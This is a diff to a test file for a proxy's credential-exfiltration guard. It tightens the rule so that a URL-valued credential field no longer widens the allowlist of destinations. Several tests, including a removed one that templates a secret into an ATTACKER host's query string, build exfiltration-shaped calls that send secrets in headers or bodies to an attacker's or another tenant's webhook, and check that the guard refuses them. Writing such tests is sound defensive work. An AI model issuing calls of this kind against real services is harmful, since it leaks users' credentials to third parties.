@@ -5,9 +5,7 @@
  * `executeApiCall` and the local resolver. A call that templates a decrypted
  * credential field (`{{field}}`) into the target, a header or a substituted
  * body does not get `allow_all_uris`: the target and every redirect hop must
- * match `authorized_uris` — plus the origin of any credential field holding an
- * absolute URL (`webhook_url`, `site_url`) — and the call is refused when that
- * list is empty.
+ * match `authorized_uris`, and the call is refused when that list is empty.
  */
 
 import { describe, it, expect, beforeEach } from "bun:test";
@@ -57,10 +55,11 @@ async function seedIntegration(
   await seedProxyConnection(ctx, PACKAGE_ID, "api", { api_key: apiKey });
 }
 
-/** `@appstrate/webhooks`-shaped auth: `allow_all_uris`, no allowlist, the endpoint is a field. */
+/** An auth whose endpoint is a credential field; `@appstrate/webhooks`-shaped by default. */
 async function seedEndpointIntegration(
   ctx: TestContext,
   fields: Record<string, string>,
+  policy = { authorizedUris: [] as string[], allowAllUris: true },
 ): Promise<void> {
   await seedProxyIntegration(
     ctx,
@@ -71,8 +70,7 @@ async function seedEndpointIntegration(
       auths: {
         api: {
           type: "custom",
-          authorizedUris: [],
-          allowAllUris: true,
+          ...policy,
           credentialFields: Object.keys(fields),
           delivery: envDelivery(
             Object.fromEntries(Object.keys(fields).map((f) => [f.toUpperCase(), f])),
@@ -213,55 +211,37 @@ describe("proxyCall — credential-exfiltration guard", () => {
     expect(up.hits.some((u) => u.startsWith(ATTACKER))).toBe(false);
   });
 
-  describe("allow_all_uris, no allowlist, endpoint held in a credential field", () => {
-    const WEBHOOK = `${ALLOWED}/hook`;
+  // A field's origin is often shared by tenants (hooks.slack.com): it never
+  // makes another endpoint on it a destination for the secret.
+  describe("a URL-valued credential field never widens the allowlist", () => {
+    // IP literals: the egress guard resolves no DNS, so only the policy refuses.
+    const VICTIM_HOOK = `${ALLOWED}/services/TVICTIM/x`;
+    const ATTACKER_HOOK = `${ALLOWED}/services/TATTACKER/y`;
     const HEADER_SECRET = "whsec-Q7zK";
 
-    beforeEach(() =>
-      seedEndpointIntegration(ctx, { webhook_url: WEBHOOK, secret_header_value: HEADER_SECRET }),
-    );
-
-    it("reaches the connection's own endpoint with a templated secret header", async () => {
-      const up = upstream();
-      const res = await call(up.fetchImpl, "{{webhook_url}}", {
-        headers: { "X-Secret": "{{secret_header_value}}" },
+    it.each([
+      ["{{webhook_url}} in the body", { body: '{"u":"{{webhook_url}}"}', substituteBody: true }],
+      ["a secret in a header", { headers: { "X-Secret": "{{secret_header_value}}" } }],
+    ])("allow_all_uris, no allowlist: refuses %s to another tenant's hook", async (_, extra) => {
+      await seedEndpointIntegration(ctx, {
+        webhook_url: VICTIM_HOOK,
+        secret_header_value: HEADER_SECRET,
       });
-      expect(res.status).toBe(200);
-      expect(up.hits).toEqual([WEBHOOK]);
-      expect(up.headers[0]!.get("x-secret")).toBe(HEADER_SECRET);
-    });
-
-    it("refuses the endpoint redirecting off its origin", async () => {
-      const up = upstream((url) =>
-        url.startsWith(ALLOWED)
-          ? new Response(null, { status: 302, headers: { location: `${ATTACKER}/x` } })
-          : new Response("{}"),
-      );
-      await expectRefused(
-        call(up.fetchImpl, "{{webhook_url}}", {
-          headers: { "X-Secret": "{{secret_header_value}}" },
-        }),
-        HEADER_SECRET,
-      );
-      expect(up.hits.some((u) => u.startsWith(ATTACKER))).toBe(false);
-    });
-
-    it("refuses a secret templated into another host", async () => {
       const up = upstream();
-      await expectRefused(
-        call(up.fetchImpl, `${ATTACKER}/?s={{secret_header_value}}`),
-        HEADER_SECRET,
-      );
+      await expectRefused(call(up.fetchImpl, ATTACKER_HOOK, extra), HEADER_SECRET);
       expect(up.hits).toEqual([]);
     });
-  });
 
-  it("reaches a base-URL field's origin under a templated path", async () => {
-    await seedEndpointIntegration(ctx, { site_url: ALLOWED, application_password: SECRET });
-    const up = upstream();
-    const res = await call(up.fetchImpl, "{{site_url}}/wp-json/wp/v2/posts");
-    expect(res.status).toBe(200);
-    expect(up.hits).toEqual([`${ALLOWED}/wp-json/wp/v2/posts`]);
+    it("declared allowlist: refuses a templated call to a field outside it", async () => {
+      await seedEndpointIntegration(
+        ctx,
+        { webhook_url: `${ATTACKER}/services/TVICTIM/x`, secret_header_value: HEADER_SECRET },
+        { authorizedUris: [`${ALLOWED}/**`], allowAllUris: false },
+      );
+      const up = upstream();
+      await expectRefused(call(up.fetchImpl, "{{webhook_url}}"), "TVICTIM");
+      expect(up.hits).toEqual([]);
+    });
   });
 
   describe("allow_all_uris without authorized_uris", () => {
